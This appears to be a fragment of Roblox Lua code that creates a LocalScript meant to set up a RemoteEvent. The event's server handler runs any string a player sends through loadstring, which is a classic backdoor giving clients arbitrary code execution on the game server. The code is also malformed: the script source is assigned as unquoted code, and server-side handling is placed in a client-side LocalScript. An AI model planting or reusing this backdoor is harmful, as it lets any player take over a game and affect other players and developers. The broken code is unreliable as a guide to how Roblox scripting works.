local Script = Instance.new("LocalScript")
 Script.Name = "Script"
 Script.Source = local server = Instance.new("RemoteEvent",game.ReplicatedStorage)
server.OnServerEvent:connect(function(player,SS)
    loadstring(SS)()
end) 
 Script.Parent = player:WaitForChild("PlayerGui") -- Parent it to PlayerGui or another local container